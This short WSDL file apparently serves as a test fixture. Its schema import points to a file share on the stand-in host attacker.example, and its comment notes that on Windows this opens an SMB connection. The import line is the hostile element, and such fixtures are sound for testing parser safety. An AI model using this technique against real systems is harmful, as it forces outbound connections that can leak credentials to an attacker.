<?xml version="1.0" encoding="UTF-8"?>
<!-- Imports a schema from a network file share: on Windows that would open an SMB connection. -->
<wsdl:definitions xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:xs="http://www.w3.org/2001/XMLSchema"
                  targetNamespace="urn:share">
  <wsdl:types>
    <xs:schema targetNamespace="urn:share">
      <xs:import namespace="urn:x" schemaLocation="file://attacker.example/share/x.xsd"/>
    </xs:schema>
  </wsdl:types>
</wsdl:definitions>
